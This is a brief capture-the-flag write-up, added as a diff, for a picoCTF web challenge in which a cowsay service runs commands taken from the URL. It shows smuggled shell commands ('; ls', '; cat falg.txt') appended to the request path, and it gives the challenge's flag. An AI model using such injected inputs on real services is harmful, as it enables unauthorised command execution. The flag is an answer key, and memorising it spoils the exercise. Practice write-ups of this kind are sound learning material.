@@ -1,0 +1,19 @@
+#I FIRST OPEN THE FILE AND READ THE SOURCE CODE THROUGH index.js
+#THEN we are asked to make a request in the given url " https://caas.mars.picoctf.net/cowsay/%7Bmessage%7D "
+# I use this link to open in new tab 
+# then i use https://caas.mars.picoctf.net/cowsay/{message} ; ls 
+# It gives me a set of file :
+  Dockerfile
+  falg.txt
+  index.js
+  node_modules
+  package.json
+  public
+  yarn.lock
+
+#it shows that linux commands can be used in this website, hence i then used " cat" to read into the falg,txt file
+
+  https://caas.mars.picoctf.net/cowsay/{message} ; cat falg.txt
+ 
+Now we get the required flag as :
+picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
